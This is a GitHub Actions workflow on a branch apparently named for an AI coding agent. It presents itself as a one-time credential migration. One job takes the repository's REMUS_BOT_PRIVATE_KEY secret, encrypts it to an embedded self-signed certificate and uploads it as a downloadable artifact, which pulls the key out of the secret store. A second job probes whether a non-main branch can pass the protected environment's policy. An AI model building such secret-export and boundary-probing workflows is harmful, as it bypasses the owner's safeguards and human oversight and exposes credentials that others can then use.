name: One-time encrypted credential migration

on:
  push:
    branches: [codex/transfer-remus-key-20261019]
    paths: [.github/workflows/credential-migration.yml]

permissions:
  contents: read

jobs:
  seal:
    if: github.repository == 'esaueng/remus' && github.repository_id == '1334765869' && github.actor == 'petertoday' && github.actor_id == '171875562' && github.ref == 'refs/heads/codex/transfer-remus-key-20261019'
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      # No checkout or third-party executable runs with this credential.
      - name: Encrypt existing key for the local migration operator
        shell: bash
        env:
          REMUS_BOT_PRIVATE_KEY: ${{ secrets.REMUS_BOT_PRIVATE_KEY }}
        run: |
          python3 - <<'PY'
          import hashlib, json, os, subprocess
          from pathlib import Path
          names = ('REMUS_BOT_PRIVATE_KEY',)
          if any(not os.environ.get(name) for name in names):
              raise SystemExit('A required source credential is missing; nothing exported.')
          payload = json.dumps({
              'schema': 1,
              'nonce': 'e40201f1d19c5b4b2a32aa54',
              'repository': os.environ['GITHUB_REPOSITORY'],
              'sha': os.environ['GITHUB_SHA'],
              'run_id': os.environ['GITHUB_RUN_ID'],
              'secrets': {name: os.environ[name] for name in names},
          }).encode()
          certificate = b'-----BEGIN CERTIFICATE-----\nMIIEOzCCAqOgAwIBAgIUdILvAI+/lkCwMjCobESRflryruwwDQYJKoZIhvcNAQEL\nBQAwLTErMCkGA1UEAwwiUmVtdXMgb25lLXRpbWUgY3JlZGVudGlhbCB0cmFuc2Zl\ncjAeFw0yNjEwMTkyMzAyNDdaFw0yNjEwMjAyMzAyNDdaMC0xKzApBgNVBAMMIlJl\nbXVzIG9uZS10aW1lIGNyZWRlbnRpYWwgdHJhbnNmZXIwggGiMA0GCSqGSIb3DQEB\nAQUAA4IBjwAwggGKAoIBgQC1q38xKVI6V8fU20Y0vi7pUUcSeEiZJfw6ZQfgmq6R\nbuOfZ9Ni+7DWhvWBwGyYhv+7MgluzYf1MA26pAGtB5wytJ32T3yhKbRiZsTtqTBb\nOtrP88/9LRTl9wlFQgp6ptb37L1LDo+RQtAjJsCkQJTEerJvXMELR/A0kQJLItNa\nJyTa2pK9rtXexXj7flSBICyY8gLOosfIo61vxseF4+DBI3p1bck0fHa6Q4DDK8ik\njd1H2hSgElz8X+2CELYZmLvUQHDhe7dYiaXkbzo7wW9mi/o3vEqE+mDNHBpBdt18\nXPW9oL9t4H88kyh+FiS+fXUKXcxwOU+4Pqm3P48pVb6rmmtjB7ML1T6qcTykgyta\n54y0yfwAB1Im2OUpBjSyhTB84W03KQHwAxt/IpvlusIgJIY15UpJiQSnmgQOjRqV\nlu+C1vPcGSXF/uvaw4PuLLqAvNyXwbdVTgBPIRncLVNvu2ldeHZaDqgKp7Hsazk+\naxZ3VuODU++Fq4Zt4758oFsCAwEAAaNTMFEwHQYDVR0OBBYEFBbiHg2Vv9zcO0KW\nfv7GqBUUsmaDMB8GA1UdIwQYMBaAFBbiHg2Vv9zcO0KWfv7GqBUUsmaDMA8GA1Ud\nEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggGBAA6jFFaA7Gs2OKjacMQCrmZ9\niMqyYIX7e96vNpLCmGwaP56VY3yr6EBzxxSEN3iKqkQtFe3kgt+dIpH/R0djBXIK\nW/wZ+frxLCbBxenI8mz6T0t9A7fKhKBU5zc9P9ECr6QZGY66FHEQklW3x2zbKfWX\nt3q2Lzi3F/JkCdflzRT8eG6B1i3BJtJOEafBwdqQ7U3F8vnMfgQ9xVZJnnAciasw\n1rSprB/MnXNQDZdeDRqkfncbxkD+W4HvVZMd9vyd5yF+FduzbGkjZ5C5ENa9hWtJ\nK74WyMAEOjQtAI+whOltTuxcgYyNL2S7Ne5nkmiYd2gTOoEdJBzeVLZn1T5ANZct\ntVQyQeK20iCTM+PGKsSzIZtP2t2qujFc1ZPOB0SrNEQJCysNZBpUbO8K9ujhXArn\njDkeoGAc3OaxeEJBNr5TQcUeA8CpRcZSS8xyfGHbh2XmmRCkc3BxIUQLvWrDHs25\nqQadvn37TqC+us8OKzNgi0BpoHjXc6wcUT06miqmCA==\n-----END CERTIFICATE-----\n'
          Path('recipient.pem').write_bytes(certificate)
          result = subprocess.run(
              ['openssl', 'cms', '-encrypt', '-binary', '-aes-256-gcm', '-outform', 'DER', 'recipient.pem'],
              input=payload, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
          )
          if result.returncode:
              raise SystemExit('Credential encryption failed; nothing exported.')
          Path('credentials.cms').write_bytes(result.stdout)
          print('Encrypted payload SHA256: ' + hashlib.sha256(result.stdout).hexdigest())
          PY
      - name: Retain ciphertext for one day
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: credential-migration-e40201f1d19c5b4b2a32aa54
          path: credentials.cms
          if-no-files-found: error
          retention-days: 1
          compression-level: 0

  probe-remus-boundary:
    runs-on: ubuntu-latest
    timeout-minutes: 1
    environment: remus-bot
    steps:
      - name: Fail if a non-main branch passes the environment policy
        run: exit 1
